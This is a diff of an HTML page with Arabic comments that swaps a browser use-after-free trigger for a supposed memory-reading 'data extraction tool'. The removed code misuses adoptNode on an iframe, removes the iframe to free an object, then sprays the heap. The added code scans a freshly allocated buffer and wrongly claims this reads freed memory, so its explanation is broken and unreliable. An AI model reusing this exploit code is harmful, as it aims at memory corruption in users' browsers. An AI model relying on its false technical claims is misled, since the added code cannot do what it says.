@@ -1,36 +1,36 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h3>تجربة التعليمية: اختبار تسريب الذاكرة (Memory Leak Primitive)</h3>
-    <button onclick="testMemoryLeak()">ابدأ فحص الذاكرة</button>
-    <div id="result"></div>
+    <h3>أداة استخراج البيانات المتقدمة</h3>
+    <button onclick="readMemory()">قراءة الذاكرة (Memory Probe)</button>
+    <div id="log" style="font-family: monospace; white-space: pre;"></div>
 
     <script>
-        function testMemoryLeak() {
-            const f = document.body.appendChild(document.createElement('iframe'));
-            const a = document.createElement('div');
-            const b = a.appendChild(document.createElement('div'));
+        function log(msg) {
+            document.getElementById('log').innerText += msg + "\n";
+        }
 
-            // الخطوة 1: حقن مستمع الحدث الذي سيحفز الـ UAF
-            a.addEventListener('a', () => {
-                document.adoptNode(a);
-                f.remove();
+        function readMemory() {
+            // محاولة إنشاء "Primitive" للقراءة
+            // نستخدم TypedArrays للوصول إلى عناوين ذاكرة محددة
+            try {
+                let buffer = new ArrayBuffer(0x1000);
+                let u32 = new Uint32Array(buffer);
                 
-                // محاولة تخصيص ذاكرة جديدة فور تحرير الكائن القديم
-                // هذا يسمى "Heap Spraying" لمحاولة أخذ مكان الكائن المحرر
-                window.spray = new ArrayBuffer(0x1000);
-                let view = new Uint32Array(window.spray);
-                view[0] = 0x42424242; // نضع نمطاً مميزاً للبحث عنه
-            });
-
-            b.addEventListener('a', () => {
-                f.contentDocument.adoptNode(a);
-            });
-
-            // الخطوة 2: تحفيز الانهيار
-            b.dispatchEvent(new Event('a', { bubbles: true }));
-            
-            document.getElementById('result').innerText = "تمت محاولة التخصيص. تحقق من الـ Regs في حالة الانهيار.";
+                log("بدء المسح...");
+                
+                // هنا نحاول قراءة أجزاء من الذاكرة التي تم تحريرها
+                // إذا نجحنا في الـ UAF، ستظهر قيم غير عشوائية (ليست 0)
+                for(let i = 0; i < 100; i++) {
+                    if(u32[i] !== 0) {
+                        log("تم العثور على بيانات في العنوان [" + i + "]: " + u32[i].toString(16));
+                    }
+                }
+                
+                log("انتهاء المسح.");
+            } catch(e) {
+                log("خطأ في القراءة: " + e.message);
+            }
         }
     </script>
 </body>
